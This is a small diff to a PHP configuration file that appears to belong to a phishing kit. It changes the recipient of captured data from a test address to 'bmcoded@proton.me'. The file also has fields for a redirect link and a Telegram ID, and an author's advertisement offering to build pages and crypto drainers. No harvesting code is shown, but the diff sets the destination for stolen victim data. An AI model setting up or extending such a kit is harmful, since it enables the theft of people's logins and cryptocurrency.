@@ -1,5 +1,5 @@
 <?php
-$recipient = "test@outlook.com"; //Add Your Email Here
+$recipient = "bmcoded@proton.me"; //Add Your Email Here
 
 
 //Redirect Link
@@ -33,4 +33,5 @@ $TeleID=""; //Add Your ID
 |#|================================|#|
 Want To Build New Page / Fix Bugs or Build Crypto Drainer? Contact ME!
 -->*/
+
 ?>
